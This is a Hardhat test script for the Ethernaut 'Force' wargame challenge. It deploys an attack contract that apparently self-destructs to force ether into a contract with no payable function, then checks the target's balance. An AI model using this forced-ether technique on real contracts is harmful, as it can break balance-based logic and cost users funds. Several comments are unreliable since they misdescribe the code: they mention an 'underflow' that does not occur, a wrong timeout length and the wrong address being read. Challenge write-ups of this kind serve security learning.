const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Force Exploit using attack contract", function () {
  let forceContract, attacker, contractAddress, balance;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x5225968E636a608B911B384107E540972A07381A"; //instance address
    // Deploy my own attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);

    await attackerContract.deployed();

    // insert contract address of ethernaut challenge
    forceContract = await ethers.getContractAt("Force", contractAddress);

    console.log(`The force contract is`, forceContract);
  });

  it("perform exploit", async function () {
    // Attack flow
    // 1) View the original balance of the force contract (should be 0)
    let originalBalance = await ethers.provider.getBalance(contractAddress);

    console.log(`The original balance is ${originalBalance}`);

    // 2)I want to send ether to my attack contract and then self destruct, sending the ethers to the foce contract
    let txAttack = await attackerContract.attack({
      value: ethers.utils.parseEther("0.0001"),
    });

    console.log("The transfer tx is ", txAttack);

    let receiptTxTransfer = await txAttack.wait();

    console.log("The transfer receipt is", receiptTxTransfer);

    // 3) Grab the balance of my attacker address after the malicious transaction is called

    balance = await ethers.provider.getBalance(contractAddress);

    console.log(`The balance of the Force contract address = ${balance}`);
  }).timeout(3000000); //Allows the attack to be ran for 30 seconds

  after("confirm exploit", async function () {
    // check if balance successfully underflowed
    expect(balance).to.be.gt("0");
  });
});
